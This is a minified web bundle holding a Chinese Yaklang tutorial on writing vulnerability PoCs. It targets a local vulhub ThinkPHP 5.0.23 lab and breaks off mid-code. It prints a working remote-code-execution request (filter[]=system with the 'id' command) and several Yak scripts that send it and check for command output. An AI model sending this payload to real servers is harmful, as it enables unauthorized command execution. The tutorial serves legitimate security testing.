(self.webpackChunkyaklang=self.webpackChunkyaklang||[]).push([[4363],{3905:function(e,n,t){"use strict";t.d(n,{Zo:function(){return d},kt:function(){return u}});var a=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function p(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=a.createContext({}),c=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},d=function(e){var n=c(e.components);return a.createElement(l.Provider,{value:n},e.children)},s={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},m=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,d=p(e,["components","mdxType","originalType","parentName"]),m=c(t),u=r,k=m["".concat(l,".").concat(u)]||m[u]||s[u]||o;return t?a.createElement(k,i(i({ref:n},d),{},{components:t})):a.createElement(k,i({ref:n},d))}));function u(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=t.length,i=new Array(o);i[0]=m;var p={};for(var l in n)hasOwnProperty.call(n,l)&&(p[l]=n[l]);p.originalType=e,p.mdxType="string"==typeof e?e:r,i[1]=p;for(var c=2;c<o;c++)i[c]=t[c];return a.createElement.apply(null,i)}return a.createElement.apply(null,t)}m.displayName="MDXCreateElement"},17740:function(e,n,t){"use strict";t.r(n),t.d(n,{frontMatter:function(){return i},contentTitle:function(){return p},metadata:function(){return l},toc:function(){return c},default:function(){return s}});var a=t(74034),r=t(79973),o=(t(67294),t(3905)),i={sidebar_position:11},p="\u5982\u4f55\u7f16\u5199\u4f18\u79c0\u7684 PoC/Exp \ud83d\udc7b",l={unversionedId:"newforyak/how_to_make_poc",id:"newforyak/how_to_make_poc",isDocsHomePage:!1,title:"\u5982\u4f55\u7f16\u5199\u4f18\u79c0\u7684 PoC/Exp \ud83d\udc7b",description:"\u5927\u5bb6\u90fd\u5f88\u6e05\u695a\uff0c\u5982\u679c\u60f3\u8981\u9a8c\u8bc1\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u6211\u4eec\u9700\u8981\u9488\u5bf9\u8fd9\u4e2a\u6f0f\u6d1e\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u63a2\u7d22\u548c\u7814\u7a76\u3002\u7ecf\u8fc7\u7814\u7a76\u6210\u56e0\u548c\u539f\u7406\u4e4b\u540e\uff0c\u6211\u4eec\u901a\u5e38\u5e0c\u671b\u5f97\u5230\u5982\u4e0b\u7ed3\u8bba\u4f5c\u4e3a\u8f93\u51fa\uff1a",source:"@site/docs/newforyak/how_to_make_poc.md",sourceDirName:"newforyak",slug:"/newforyak/how_to_make_poc",permalink:"/en/docs/newforyak/how_to_make_poc",editUrl:"https://github.com/yaklang/docs/newforyak/how_to_make_poc.md",tags:[],version:"current",sidebarPosition:11,frontMatter:{sidebar_position:11},sidebar:"tutorialSidebar",previous:{title:"Web Fuzz \u9ad8\u7ea7\u6559\u7a0b",permalink:"/en/docs/newforyak/fuzz_for_more"},next:{title:"\u521d\u63a2\u88ab\u52a8\u626b\u63cf",permalink:"/en/docs/newforyak/passive_scan"}},c=[{value:"\u7f16\u5199\u4f18\u79c0\u7684 Web \u6f0f\u6d1e PoC \u7684\u5173\u952e\uff1a",id:"\u7f16\u5199\u4f18\u79c0\u7684-web-\u6f0f\u6d1e-poc-\u7684\u5173\u952e\uff1a",children:[]},{value:"Yak \u4e2d\u53ef\u4ee5\u7528\u6765\u7f16\u5199 PoC/Exp \u7684\u6a21\u5757",id:"yak-\u4e2d\u53ef\u4ee5\u7528\u6765\u7f16\u5199-pocexp-\u7684\u6a21\u5757",children:[]},{value:"\u5728 Yak \u4e2d\uff0c\u5982\u4f55\u7f16\u5199 PoC\uff1f",id:"\u5728-yak-\u4e2d\uff0c\u5982\u4f55\u7f16\u5199-poc\uff1f",children:[{value:"\u9009\u62e9\u6f0f\u6d1e\uff0c\u6784\u5efa\u9776\u573a",id:"\u9009\u62e9\u6f0f\u6d1e\uff0c\u6784\u5efa\u9776\u573a",children:[]},{value:"\u4f7f\u7528 <code>poc</code> \u6784\u5efa PoC",id:"\u4f7f\u7528-poc-\u6784\u5efa-poc",children:[]},{value:"\u4f7f\u7528 <code>http</code> \u6784\u9020 PoC",id:"\u4f7f\u7528-http-\u6784\u9020-poc",children:[]},{value:"\u4f7f\u7528 <code>fuzz</code> \u6784\u9020 PoC",id:"\u4f7f\u7528-fuzz-\u6784\u9020-poc",children:[]},{value:"\u4f7f\u7528 <code>nuclei</code> \u7f16\u5199 PoC",id:"\u4f7f\u7528-nuclei-\u7f16\u5199-poc",children:[]}]},{value:"\u6f0f\u6d1e PoC <code>\u89c4\u6a21\u5316/\u6b66\u5668\u5316</code>",id:"\u6f0f\u6d1e-poc-\u89c4\u6a21\u5316\u6b66\u5668\u5316",children:[{value:"\u56de\u987e\u4e00\u4e0b\u6211\u4eec\u5728 <code>fuzz</code> \u4e2d\u5b66\u4e60\u7684\u6280\u80fd",id:"\u56de\u987e\u4e00\u4e0b\u6211\u4eec\u5728-fuzz-\u4e2d\u5b66\u4e60\u7684\u6280\u80fd",children:[]},{value:"\u5176\u6b21\u6211\u4eec\u89e3\u51b3\u6279\u91cf\u8c03\u7528\u7684\u95ee\u9898\uff0c\u51fd\u6570\u5316+\u6a21\u5757\u5316",id:"\u5176\u6b21\u6211\u4eec\u89e3\u51b3\u6279\u91cf\u8c03\u7528\u7684\u95ee\u9898\uff0c\u51fd\u6570\u5316\u6a21\u5757\u5316",children:[]}]},{value:"\u7ed3\u8bed",id:"\u7ed3\u8bed",children:[]}],d={toc:c};function s(e){var n=e.components,t=(0,r.Z)(e,["components"]);return(0,o.kt)("wrapper",(0,a.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"\u5982\u4f55\u7f16\u5199\u4f18\u79c0\u7684-pocexp-"},"\u5982\u4f55\u7f16\u5199\u4f18\u79c0\u7684 PoC/Exp \ud83d\udc7b"),(0,o.kt)("p",null,"\u5927\u5bb6\u90fd\u5f88\u6e05\u695a\uff0c\u5982\u679c\u60f3\u8981\u9a8c\u8bc1\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u6211\u4eec\u9700\u8981\u9488\u5bf9\u8fd9\u4e2a\u6f0f\u6d1e\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u63a2\u7d22\u548c\u7814\u7a76\u3002\u7ecf\u8fc7\u7814\u7a76\u6210\u56e0\u548c\u539f\u7406\u4e4b\u540e\uff0c\u6211\u4eec\u901a\u5e38\u5e0c\u671b\u5f97\u5230\u5982\u4e0b\u7ed3\u8bba\u4f5c\u4e3a\u8f93\u51fa\uff1a"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"\u6f0f\u6d1e\u7684\u7814\u7a76\u62a5\u544a"),(0,o.kt)("li",{parentName:"ol"},"\u6f0f\u6d1e\u7684 PoC\uff08\u6982\u5ff5\u6027\u9a8c\u8bc1\uff09\uff1a\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\u4e00\u6bb5\u53ef\u4ee5\u9a8c\u8bc1\u4e00\u4e2a\u76ee\u6807\u662f\u5426\u5b58\u5728\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u7a0b\u5e8f/\u4ee3\u7801/\u811a\u672c\u3002"),(0,o.kt)("li",{parentName:"ol"},"\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u5f0f\uff1a\u5bf9\u8fd9\u4e2a\u6f0f\u6d1e\u9020\u6210\u5371\u5bb3\u7684\u5229\u7528\u548c\u5b9e\u8df5\u3002")),(0,o.kt)("h2",{id:"\u7f16\u5199\u4f18\u79c0\u7684-web-\u6f0f\u6d1e-poc-\u7684\u5173\u952e\uff1a"},"\u7f16\u5199\u4f18\u79c0\u7684 Web \u6f0f\u6d1e PoC \u7684\u5173\u952e\uff1a"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"\u4ee3\u7801\u672c\u8eab\u7684\u5065\u58ee\u6027\uff0c\u4ee3\u7801\u672c\u8eab\u6700\u597d\u4e0d\u80fd\u6709\u5bfc\u81f4\u65e0\u6cd5\u8fd0\u884c\u6f0f\u6d1e\u68c0\u6d4b\u7684 BUG\u3002"),(0,o.kt)("li",{parentName:"ol"},"\u9488\u5bf9\u590d\u6742\u8f93\u5165\u7684\u517c\u5bb9\uff1a",(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},"\u51cf\u8f7b\u7528\u6237\u7504\u522b\u7684\u8d1f\u62c5\uff1a\u5982\u679c\u8981\u6c42\u7684\u662f\u4e3b\u673a+\u7aef\u53e3\uff0c\u5219\u80fd\u628a URL \u7b49\u8f93\u5165\u81ea\u52a8\u89e3\u6790\u6210\u60f3\u8981\u7684\u683c\u5f0f"),(0,o.kt)("li",{parentName:"ol"},"\u5982\u679c\u76ee\u6807\u662f\u7279\u5b9a\u8def\u5f84\u7684 URL\uff0c\u8981\u53ef\u4ee5\u80fd\u89e3\u6790\u8f93\u5165\u7684 IP \u4ee5\u53ca\u9ed8\u8ba4\u7aef\u53e3\u7b49\u4fe1\u606f\uff0c\u7ec4\u5408\u51fa\u5408\u7406\u7684 URL"),(0,o.kt)("li",{parentName:"ol"},"\u5982\u679c\u626b\u63cf\u76ee\u6807\u7684 URL \u4e0d\u56fa\u5b9a\uff0c\u9700\u8981\u9875\u9762\u591a\u4e2a URL \u6765\u4f5c\u4e3a\u8f93\u5165\u90fd\u8fdb\u884c\u6f0f\u6d1e\u68c0\u6d4b\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u722c\u866b\u6a21\u5757\u6216\u7f16\u5199\u66f4\u8be6\u7ec6\u7684\u903b\u8f91\u6765\u786e\u5b9a\u626b\u63cf\u76ee\u6807\u3002"),(0,o.kt)("li",{parentName:"ol"},"\u7528\u6237\u8f93\u5165\u7684 URL \u8def\u5f84\uff0c\u5c3d\u91cf\u901a\u8fc7 ",(0,o.kt)("inlineCode",{parentName:"li"},"str.UrlJoin()")," \u6765\u8fde\u63a5\u3002"))),(0,o.kt)("li",{parentName:"ol"},"\u53ef\u89c4\u6a21\u5316\u9a8c\u8bc1\uff1a",(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},"\u4e3a\u4e86\u89e3\u51b3\u901f\u5ea6\u95ee\u9898\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5728\u6f0f\u6d1e\u68c0\u6d4b\u4e4b\u524d\u7f16\u5199\u7b80\u5355\u7684\u6307\u7eb9\u8bc6\u522b\uff0c\u7b5b\u9664\u4e00\u4e9b\u4e0d\u5408\u7406\u7684\u76ee\u6807"),(0,o.kt)("li",{parentName:"ol"},"\u5e38\u91cf\u53ef\u4ee5\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\uff0c\u53d8\u91cf\u4e0d\u5e94\u8be5\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf")))),(0,o.kt)("h2",{id:"yak-\u4e2d\u53ef\u4ee5\u7528\u6765\u7f16\u5199-pocexp-\u7684\u6a21\u5757"},"Yak \u4e2d\u53ef\u4ee5\u7528\u6765\u7f16\u5199 PoC/Exp \u7684\u6a21\u5757"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"\u3010\u6700\u63a8\u8350\u3011",(0,o.kt)("a",{parentName:"li",href:"/docs/api/poc"},(0,o.kt)("inlineCode",{parentName:"a"},"poc")," \u6700\u7b80\u5355\u7684\u65b9\u6848\u8fdb\u884c PoC \u53d1\u5305")),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("a",{parentName:"li",href:"/docs/buildinlibs/lib_http"},(0,o.kt)("inlineCode",{parentName:"a"},"http")," \u6a21\u5757\u7528\u4e8e\u53d1\u6700\u57fa\u7840\u7684 HTTP \u8bf7\u6c42")),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("a",{parentName:"li",href:"/docs/buildinlibs/lib_fuzz"},(0,o.kt)("inlineCode",{parentName:"a"},"fuzz")," \u7528\u4e8e\u6784\u9020\u53ef\u7528\u4e8e\u6a21\u7cca\u6d4b\u8bd5\u7684 HTTP \u8bf7\u6c42")),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("a",{parentName:"li",href:"/docs/buildinlibs/lib_nuclei"},(0,o.kt)("inlineCode",{parentName:"a"},"nuclei")," \u6784\u9020\u9002\u914d\u4e8e nuclei yaml poc \u7684 PoC"))),(0,o.kt)("h2",{id:"\u5728-yak-\u4e2d\uff0c\u5982\u4f55\u7f16\u5199-poc\uff1f"},"\u5728 Yak \u4e2d\uff0c\u5982\u4f55\u7f16\u5199 PoC\uff1f"),(0,o.kt)("p",null,"\u7f16\u5199 PoC \u867d\u7136\u53ea\u662f Yak \u7684\u4e00\u4e2a\u5355\u4e00\u7684\u7528\u9014\uff0c\u4f46\u662f\u5e76\u4e0d\u610f\u5473\u7740\u6211\u4eec\u5bf9\u8fd9\u4e2a\u529f\u80fd\u662f\u4e0d\u91cd\u89c6\u7684\u3002"),(0,o.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,o.kt)("div",{parentName:"div",className:"admonition-heading"},(0,o.kt)("h5",{parentName:"div"},(0,o.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,o.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,o.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"tip")),(0,o.kt)("div",{parentName:"div",className:"admonition-content"},(0,o.kt)("p",{parentName:"div"},"\u7ec6\u5fc3\u7684\u670b\u53cb\u4e00\u7ecf\u53d1\u73b0\u4e86\uff0c\u6211\u4eec\u6709\u610f\u628a\u8fd9\u4e00\u8282\u7684\u5185\u5bb9\u653e\u5728\u4e86\u51e0\u4e4e\u662f\u6574\u4e2a\u5b89\u5168\u7814\u53d1\u6559\u7a0b\u7684\u7ed3\u5c3e\u3002"),(0,o.kt)("p",{parentName:"div"},"\u610f\u56fe\u5f88\u660e\u663e\uff1a\u6211\u4eec\u60f3\u544a\u8bc9\u7528\u6237\uff0cPoC \u7684\u7f16\u5199\uff0c\u5e76\u4e0d\u771f\u7684\u53ea\u9760\u7528\u6237\u81ea\u5df1\u53bb\u7f16\u5199\u6240\u6709\u903b\u8f91"),(0,o.kt)("ol",{parentName:"div"},(0,o.kt)("li",{parentName:"ol"},"\u5982\u679c\u4f60\u7684 PoC \u9700\u8981\u7528\u5230\u722c\u866b\uff0c\u90a3 Yak \u6709\u722c\u866b\u53ef\u4ee5\u5e2e\u52a9\u4f60 ",(0,o.kt)("a",{parentName:"li",href:"/docs/buildinlibs/lib_crawler"},(0,o.kt)("inlineCode",{parentName:"a"},"crawler")," \u4f7f\u7528\u6559\u7a0b")),(0,o.kt)("li",{parentName:"ol"},"\u5982\u679c\u4f60\u7684 PoC \u9700\u8981\u6761\u4ef6\u7ade\u4e89\uff0c",(0,o.kt)("a",{parentName:"li",href:"/docs/buildinlibs/lib_fuzz"},(0,o.kt)("inlineCode",{parentName:"a"},"\u90a3\u5c31\u7528 "),"fuzz",(0,o.kt)("inlineCode",{parentName:"a"}," \u6a21\u5757"))),(0,o.kt)("li",{parentName:"ol"},"\u5982\u679c\u4f60\u7684\u4f1a\u5199 nuclei yaml poc\uff0c\u90a3\u4e48\u4e5f\u53ef\u4ee5\u628a\u4f60\u7684 PoC ",(0,o.kt)("a",{parentName:"li",href:"/docs/buildinlibs/lib_nuclei"},(0,o.kt)("inlineCode",{parentName:"a"},"\u76f4\u63a5\u4ea4\u7ed9 nuclei \u6a21\u5757\u53bb\u626b\u63cf")))))),(0,o.kt)("p",null,"\u5728\u7f16\u5199 PoC \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c06\u7ed9\u5927\u5bb6\u8bb2\u89e3\u540c\u4e00\u4e2a PoC \u7684\u4e09\u79cd\u5199\u6cd5\uff0c\u54ea\u4e00\u79cd\u5199\u6cd5\u90fd\u53ef\u4ee5\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u884c\u9009\u7528\u6700\u65b9\u4fbf\u7684\u3002"),(0,o.kt)("h3",{id:"\u9009\u62e9\u6f0f\u6d1e\uff0c\u6784\u5efa\u9776\u573a"},"\u9009\u62e9\u6f0f\u6d1e\uff0c\u6784\u5efa\u9776\u573a"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"\u6ce8\u610f: \u6211\u4eec\u4f7f\u7528 ",(0,o.kt)("a",{parentName:"strong",href:"https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce"},(0,o.kt)("inlineCode",{parentName:"a"},"vulhub"),"\u4e2d ThinkPHP \u6846\u67b6\u7684\u9776\u573a\u4f5c\u4e3a\u76ee\u6807\u9776\u573a"))),(0,o.kt)("p",null,"\u901a\u8fc7\u5bf9\u9776\u573a\u7684\u4e86\u89e3\uff0c\u6211\u4eec\u901a\u8fc7"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"git clone https://github.com/vulhub/vulhub --depth 1\ncd vulhub/thinkphp/5.0.23-rce\ndocker-compose up -d\n")),(0,o.kt)("p",null,"\u6765\u542f\u52a8\u9776\u573a\uff0c\u7136\u540e\u9605\u8bfb ",(0,o.kt)("inlineCode",{parentName:"p"},"README"),"\uff0c\u6211\u4eec\u53d1\u73b0\u4ee5\u4e0b\u6570\u636e\u5305\u662f\u5173\u952e PoC"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-http"},"POST /index.php?s=captcha HTTP/1.1\nHost: localhost\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\n\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\n")),(0,o.kt)("p",null,"\u9488\u5bf9\u8fd9\u4e2a\u6570\u636e\u5305\uff0c\u6211\u4e48\u53ef\u4ee5\u6709\u4e0b\u9762\u4e3b\u8981\u4e09\u79cd\u65b9\u6cd5\u6765\u6784\u9020 PoC\uff0c\u4e3e\u6700\u7b80\u5355\u7684\u4f8b\u5b50\u3002"),(0,o.kt)("h3",{id:"\u4f7f\u7528-poc-\u6784\u5efa-poc"},"\u4f7f\u7528 ",(0,o.kt)("inlineCode",{parentName:"h3"},"poc")," \u6784\u5efa PoC"),(0,o.kt)("p",null,"\u7531\u4e8e\u7edd\u5927\u90e8\u5206\u7684 Web \u7c7b PoC \u90fd\u662f\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5305\uff0c\u68c0\u67e5\u7ed3\u679c\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5b9a\u5411\u9488\u5bf9\u8fd9\u79cd\u60c5\u51b5\u505a\u4f18\u5316\u3002"),(0,o.kt)("p",null,'\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u7cbe\u51c6\u66ff\u6362\u6389\u6570\u636e\u5305\u4e2d\u53c2\u6570\u7684\u5185\u5bb9\uff0c\u800c\u4e0d\u9700\u8981\u4e13\u95e8\u53bb\u6784\u9020\u4e00\u4e2a\u6570\u636e\u5305\u7684\u5404\u79cd\u5176\u4ed6 "\u65e0\u5173" \u7684\u53c2\u6570\u3002'),(0,o.kt)("p",null,"\u6700\u7b80\u5355\u66b4\u529b\u7684\u5c31\u662f\uff0c\u6211\u4eec\u76f4\u63a5\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5305\uff01"),(0,o.kt)("p",null,"\u5728\u5982\u4e0b\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7 ",(0,o.kt)("inlineCode",{parentName:"p"},"func poc.HTTP(packetRaw: string|[]byte, extraParams ...opt) (responseRaw: []byte, requestRaw: []byte, err error)")," \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5305\u3002"),(0,o.kt)("p",null,"\u9047\u5230\u9700\u8981\u66ff\u6362\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u4f7f\u7528 ",(0,o.kt)("inlineCode",{parentName:"p"},"{{param(name)}}")," \u6807\u7b7e\u6765\u6807\u8bb0\uff0c\u7136\u540e\u6807\u8bb0\u4e2d ",(0,o.kt)("inlineCode",{parentName:"p"},"param()")," \u4e2d\u62ec\u53f7\u4e2d\u7684\u5185\u5bb9\u662f\u6211\u4eec\u9700\u8981\u66ff\u6362\u7684\u53c2\u6570\u540d\u79f0\u3002"),(0,o.kt)("p",null,"\u4f8b\u5982\u5982\u4e0b\u6848\u4f8b\uff0c\u6211\u4eec\u5728 ",(0,o.kt)("inlineCode",{parentName:"p"},"Host: {{param(target)}}")," \u4e2d\u6807\u8bb0\u4e86\u53c2\u6570\uff0c\u901a\u8fc7 ",(0,o.kt)("inlineCode",{parentName:"p"},'poc.HTTP(packet, http.params({"target": "localhost:8080"}))')," \u4e2d\u7684 ",(0,o.kt)("inlineCode",{parentName:"p"},"http.params")," \u53ef\u4ee5\u66ff\u6362\u6389\u6807\u8bb0\u7684\u5185\u5bb9\u3002"),(0,o.kt)("p",null,"\u4ece\u800c\u6784\u5efa\u4e00\u4e2a\u5b8c\u6574\u7684\u6570\u636e\u5305\uff0c\u8fd9\u4e2a\u6570\u636e\u5305\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 ",(0,o.kt)("inlineCode",{parentName:"p"},"poc.HTTP")," \u53d1\u9001\u51fa\u53bb\uff0c\u628a\u6700\u6700\u539f\u59cb\u7684\u7ed3\u679c\u8fd4\u56de\u7ed9\u7528\u6237\u3002"),(0,o.kt)("p",null,"\u8fd4\u56de\u7684\u5185\u5bb9\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"response \u7684\u539f\u59cb\u6570\u636e\u5305\u5185\u5bb9"),(0,o.kt)("li",{parentName:"ol"},"request \u539f\u59cb\u6570\u636e\u5305\u5185\u5bb9"),(0,o.kt)("li",{parentName:"ol"},"error \u5931\u8d25\u539f\u56e0\uff08\u5982\u679c\u6ca1\u6709\u5931\u8d25\uff0c\u8fd9\u4e2a\u503c\u4e3a ",(0,o.kt)("inlineCode",{parentName:"li"},"nil"),"\uff09 ")),(0,o.kt)("p",null,"\u5177\u4f53\u4ee3\u7801\u5982\u4e0b"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-go"},'rsp, req, err := poc.HTTP(`\nPOST /index.php?s=captcha HTTP/1.1\nHost: {{param(target)}}\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\n\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\n`, poc.params({\n    "target": "localhost:8080",\n}))\ndie(err)\n\nif re.Match(`((uid\\=\\d*)|(gid\\=\\d*)|(groups=\\d*))`, rsp) {\n    println("found thinkphp vuls...")\n    break\n}\n')),(0,o.kt)("p",null,"\u5f53\u7136\u5982\u679c\u9700\u8981\u9488\u5bf9\u8fd4\u56de\u7684\u6570\u636e\u5305\u8fdb\u884c\u7cbe\u7ec6\u5316\u5904\u7406\uff0c\u53ef\u4ee5\u53c2\u8003 ",(0,o.kt)("a",{parentName:"p",href:"/docs/api/poc"},(0,o.kt)("inlineCode",{parentName:"a"},"poc")," \u8f85\u52a9\u5e93\u4e2d\u6240\u6709\u53ef\u7528\u53c2\u6570")),(0,o.kt)("h3",{id:"\u4f7f\u7528-http-\u6784\u9020-poc"},"\u4f7f\u7528 ",(0,o.kt)("inlineCode",{parentName:"h3"},"http")," \u6784\u9020 PoC"),(0,o.kt)("p",null,"\u5982\u679c\u4e00\u4e2a PoC \u4ec5\u4ec5\u662f\u7279\u522b\u57fa\u7840\u7684\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\uff0c\u6839\u636e\u8fd4\u56de\u7684\u7ed3\u679c\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\uff0c\u90a3\u4e48\u8fd9\u4e2a PoC \u7684\u7f16\u5199\u5176\u5b9e\u975e\u5e38\u7b80\u5355"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-go"},'// \u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\nrsp, err := http.Post(\n    "http://127.0.0.1:8080/index.php?s=captcha",\n    http.header("Content-Type", "application/x-www-form-urlencoded"),\n    http.body(`_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id`),\n)\nif err != nil {\n    die(err)\n}\n\n// \u8c03\u8bd5\u5de5\u5177\uff0c\u53ef\u4ee5\u770b\u5230\u539f\u59cb\u76f8\u5e94\u5305\u662f\u5565\u3002\n// http.show(rsp)\n\n// \u628a\u539f\u59cb\u76f8\u5e94\u5305\u6253\u5370\u51fa\u6765\nrawPacket, err := http.dump(rsp)\nif err != nil {\n    die(err)\n}\n\n// \u7f16\u5199\u4e00\u4e2a\u6b63\u5219\uff0c\u6765\u5224\u65ad\u671f\u671b\u7684\u7ed3\u679c\u662f\u5426\u4ea7\u751f\nif re.Match(`((uid\\=\\d*)|(gid\\=\\d*)|(groups=\\d*))`, rawPacket/*type: any*/) {\n    println("found thinkphp vul!")\n}\n')),(0,o.kt)("p",null,"\u6211\u4eec\u53d1\u73b0\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u5176\u5b9e\u975e\u5e38\u5bb9\u6613\u8ba9\u4eba\u7406\u89e3\uff0c\u4f7f\u7528 http \u5e93\u53d1\u9001\u4e86\u4e00\u4e2a\u6784\u9020\u7279\u5b9a Payload \u7684\u8bf7\u6c42\u3002"),(0,o.kt)("p",null,"\u7136\u540e\u4f7f\u7528\u4e00\u4e2a\u89c4\u5219\u6765\u68c0\u6d4b\u6f0f\u6d1e\u3002"),(0,o.kt)("h3",{id:"\u4f7f\u7528-fuzz-\u6784\u9020-poc"},"\u4f7f\u7528 ",(0,o.kt)("inlineCode",{parentName:"h3"},"fuzz")," \u6784\u9020 PoC"),(0,o.kt)("p",null,"\u4f5c\u4e3a\u5bf9\u6bd4\uff0c\u6211\u4eec\u4f7f\u7528 ",(0,o.kt)("inlineCode",{parentName:"p"},"fuzz")," \u6a21\u5757\u6765\u6784\u5efa\u66f4\u5bb9\u6613\u8ba9\u4eba\u7406\u89e3\u7684 PoC\uff1b"),(0,o.kt)("p",null,"\u8fd9\u4e2a\u65b9\u6cd5\u6bd4 ",(0,o.kt)("inlineCode",{parentName:"p"},"http")," \u66f4\u597d\u7684\u662f\uff1a",(0,o.kt)("strong",{parentName:"p"},"\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u628a\u6570\u636e\u5305\u76f4\u63a5\u590d\u5236\u5728\u4ee3\u7801\u4e2d\uff0c\u51cf\u5c11\u5927\u5bb6\u7684\u7406\u89e3\u548c\u8c03\u8bd5\u6210\u672c")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-go"},'fReq, err := fuzz.HTTPRequest(`\nPOST /index.php?s=captcha HTTP/1.1\nHost: localhost:8080\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\n\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\n`)\nif err != nil {\n    die(err)\n}\n\nreqs, err := fReq.Exec()\nif err != nil {\n    die(err)\n}\n\nfor rsp = range reqs {\n    if rsp.Error != nil {\n        log.error(rsp.Error)\n        continue\n    }\n\n    if 